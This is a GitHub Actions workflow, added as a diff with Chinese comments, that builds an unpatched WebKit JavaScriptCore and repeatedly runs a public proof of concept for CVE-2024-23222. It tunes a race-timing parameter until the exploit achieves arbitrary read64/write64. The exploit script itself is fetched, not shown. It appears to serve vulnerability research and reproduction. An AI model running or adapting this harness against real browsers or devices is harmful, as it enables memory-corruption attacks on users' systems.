@@ -1,0 +1,185 @@
+# Coruna / CVE-2024-23222 —— 在 GitHub Actions 免费 Apple Silicon runner 上复现 read64/write64
+#
+# 为什么用 runner 而不是自己买机器：
+#   macos-14 / macos-15 是真正的 Apple M1/M2 (arm64)，与 califio 标定 89% 命中率的环境同架构。
+#   公开仓库的 Actions 额度不限量、不计费。你不需要信用卡、不需要买任何东西。
+#
+# 用法：
+#   1. 建一个 PUBLIC 仓库，把本文件放到 .github/workflows/coruna-jsc-rw.yml
+#   2. Actions 页 → Coruna JSC RW → Run workflow
+#   3. pivot_mode 留 auto 直接跑；扫出来的平台期会打印在日志里
+#
+# 产物：jsc 二进制 + 全量日志，可在 run 页面底部 Artifacts 下载。
+
+name: Coruna JSC RW
+
+on:
+  workflow_dispatch:
+    inputs:
+      pivot_mode:
+        description: 'auto = 先扫 PIVOT 平台期再打；fixed = 只用下面的固定值'
+        type: choice
+        options: [auto, fixed]
+        default: auto
+      pivot_fixed:
+        description: 'pivot_mode=fixed 时生效（M 系列参考平台期 173000-186000）'
+        default: '178000'
+      warmup:
+        description: 'WARMUP（PoC 默认 250000）'
+        default: '250000'
+
+jobs:
+  build-and-hit:
+    # macos-14 = Apple M1, 3 vCPU, 7GB RAM, ~14GB SSD（公开仓库免费）
+    runs-on: macos-14
+    timeout-minutes: 350
+
+    env:
+      WEBKIT_TAG: WebKit-7617.1.17.13.7
+      WARMUP: ${{ github.event.inputs.warmup }}
+      PIVOT_MODE: ${{ github.event.inputs.pivot_mode }}
+      PIVOT_FIXED: ${{ github.event.inputs.pivot_fixed }}
+      GC_FLUSH: '1048576'
+
+    steps:
+      - name: 环境自检
+        run: |
+          echo "=== arch ==="; uname -m
+          echo "=== cpu ==="; sysctl -n machdep.cpu.brand_string || true
+          echo "=== mem ==="; sysctl -n hw.memsize | awk '{printf "%.1f GB\n", $1/1073741824}'
+          echo "=== disk ==="; df -h /
+          echo "=== xcode ==="; xcodebuild -version
+          echo "=== sw ==="; sw_vers
+
+      - name: 腾磁盘（runner 只有 ~14GB 可用，WebKit 构建吃紧）
+        run: |
+          sudo rm -rf /Users/runner/Library/Android/sdk || true
+          sudo rm -rf /usr/local/share/dotnet || true
+          sudo rm -rf /usr/local/lib/android || true
+          sudo rm -rf ~/.rustup ~/.cargo || true
+          sudo rm -rf /usr/local/Homebrew/Library/Taps || true
+          # Xcode 的旧 simulator runtime 是最大块，占数 GB
+          sudo rm -rf /Library/Developer/CoreSimulator/Profiles/Runtimes/* || true
+          df -h /
+
+      - name: 取 PoC（califio clean-room 版，只读不改）
+        run: |
+          git clone --depth 1 https://github.com/califio/publications.git califio
+          ls -l califio/MADBugs/coruna/poc/
+          # 记录 PoC 哈希：PIVOT 对脚本体积敏感，哈希变了平台期就得重扫
+          shasum -a 256 califio/MADBugs/coruna/poc/cve-2024-23222-rw.js \
+            | tee poc.sha256
+
+      - name: 装构建依赖
+        run: |
+          brew install cmake ninja || brew upgrade cmake ninja
+          cmake --version | head -1
+          ninja --version
+
+      - name: Clone WebKit（必须全历史，tag 从 main 不可达）
+        run: |
+          git clone --filter=blob:none https://github.com/WebKit/WebKit.git webkit
+          cd webkit
+          git checkout "${WEBKIT_TAG}"
+          echo "=== commit ==="; git rev-parse HEAD
+          # 漏洞状态自查：补丁新增了这个文件，存在 = 已修补
+          if [ -f Source/JavaScriptCore/dfg/DFGDesiredObjectProperties.cpp ]; then
+            echo "::error::检出的是已修补版本，无法复现"
+            exit 1
+          fi
+          echo "OK: 未修补（DFGDesiredObjectProperties.cpp 不存在）"
+
+      - name: 构建 jsc（Release，必须 Release）
+        run: |
+          cd webkit
+          # 7GB 内存，不显式限并发也行；若 OOM 再降到 --makeargs=-j2
+          Tools/Scripts/build-jsc --release
+          ls -lh WebKitBuild/Release/jsc
+
+      - name: 重签 jsc 指向自己旁边的 framework
+        run: |
+          cd webkit
+          JSC=WebKitBuild/Release/jsc
+          install_name_tool -change \
+            /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore \
+            @executable_path/JavaScriptCore.framework/Versions/A/JavaScriptCore \
+            "$JSC"
+          codesign -f -s - "$JSC"
+          echo "=== 依赖确认 ==="
+          otool -L "$JSC" | head -20
+          # 冒烟测试：确认能跑
+          "$JSC" -e 'print("jsc alive: " + (0xdeadbeef).toString(16))'
+
+      - name: 先证可达（tryGetConstantProperty 是否可达）
+        run: |
+          cd webkit
+          JSC=WebKitBuild/Release/jsc
+          # 这一步只证明 tgcp 可达，不依赖竞态命中，适合先验证构建正确
+          "$JSC" ../califio/MADBugs/coruna/poc/cve-2024-23222-tgcp-reach.js 2>&1 | tail -40 || true
+
+      - name: 扫 PIVOT 平台期
+        if: env.PIVOT_MODE == 'auto'
+        run: |
+          cd webkit
+          JSC=WebKitBuild/Release/jsc
+          POC=../califio/MADBugs/coruna/poc/cve-2024-23222-rw.js
+          echo "warmup=${WARMUP} gc_flush=${GC_FLUSH}"
+          BEST=0; BEST_HITS=0
+          for p in $(seq 165000 3000 195000); do
+            hits=0
+            for i in 1 2 3 4 5 6 7 8 9 10; do
+              # 竞态一进程一次，必须每次重新起进程
+              if "$JSC" "$POC" -- "${WARMUP}" "$p" "${GC_FLUSH}" 2>&1 | grep -q "read64 OK"; then
+                hits=$((hits+1))
+              fi
+            done
+            printf "PIVOT=%-7d  %2d/10\n" "$p" "$hits"
+            if [ "$hits" -gt "$BEST_HITS" ]; then BEST_HITS=$hits; BEST=$p; fi
+          done
+          echo "PLATEAU_BEST_PIVOT=${BEST}" | tee -a "$GITHUB_ENV"
+          echo "PLATEAU_BEST_HITS=${BEST_HITS}" | tee -a "$GITHUB_ENV"
+          echo "=== 最优 PIVOT=${BEST} 命中 ${BEST_HITS}/10 ==="
+
+      - name: 定 PIVOT
+        run: |
+          if [ "$PIVOT_MODE" = "auto" ]; then
+            P="${PLATEAU_BEST_PIVOT:-178000}"
+          else
+            P="$PIVOT_FIXED"
+          fi
+          echo "FINAL_PIVOT=$P" | tee -a "$GITHUB_ENV"
+
+      - name: 打到命中（retry 循环，竞态一进程一次）
+        run: |
+          cd webkit
+          JSC=WebKitBuild/Release/jsc
+          POC=../califio/MADBugs/coruna/poc/cve-2024-23222-rw.js
+          echo "FINAL_PIVOT=${FINAL_PIVOT}  WARMUP=${WARMUP}"
+          n=0; MAX=60
+          while [ "$n" -lt "$MAX" ]; do
+            n=$((n+1))
+            OUT=$("$JSC" "$POC" -- "${WARMUP}" "${FINAL_PIVOT}" "${GC_FLUSH}" 2>&1)
+            if echo "$OUT" | grep -q "read64 OK"; then
+              echo "==================== HIT on attempt ${n} ===================="
+              echo "$OUT"
+              echo "============================================================"
+              echo "$OUT" > ../HIT_OUTPUT.txt
+              exit 0
+            fi
+            echo "attempt ${n}: miss"
+          done
+          echo "::warning::${MAX} 次未命中，换 PIVOT 重跑本 workflow"
+          exit 1
+
+      - name: 上传产物
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: coruna-jsc-and-logs
+          if-no-files-found: warn
+          retention-days: 14
+          path: |
+            webkit/WebKitBuild/Release/jsc
+            webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore
+            HIT_OUTPUT.txt
+            poc.sha256
